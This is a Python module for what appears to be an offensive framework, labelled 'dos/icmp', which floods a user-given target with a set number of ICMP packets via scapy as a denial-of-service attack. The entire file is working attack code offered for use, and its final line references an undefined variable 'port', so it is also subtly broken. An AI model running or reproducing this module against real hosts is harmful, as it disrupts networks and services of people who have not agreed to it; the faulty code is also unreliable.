import requests
from rich.console import Console
from rich.table import Table
from scapy.all import send, IP, ICMP
import socket
import random
import os


class Module:
    def __init__(self, logger):
        self.logger = logger
        self.name = "dos/icmp"
        self.description = "ICMP based DoS attack."
        self.author = "Onur Atakan ULUSOY"
        self.runauto = False        
        self.options = {
            "target": {"value": None, "required": True},
            "amount": {"value": None, "required": True},
        }

    def info(self):
        console = Console()
        table = Table()
        table.add_column("Name")
        table.add_column("Description")
        table.add_column("Author")
        table.add_row(self.name, self.description, self.author)
        console.print(table)


    def run(self):
        for key in self.options:
            if (
                self.options[key]["value"] is None
                and self.options[key]["required"] is True
            ):
                self.logger.error(f"Required key {str(key)} is not set for {self.name}")
                return


        target = self.options["target"]["value"]
        amount = int(self.options["amount"]["value"])


        for i in range(amount):
            send(IP(dst=target)/ICMP())

        print(f"\033[32m[+]\033[0m Finished ICMP based DoS attack on {target}-{port}")


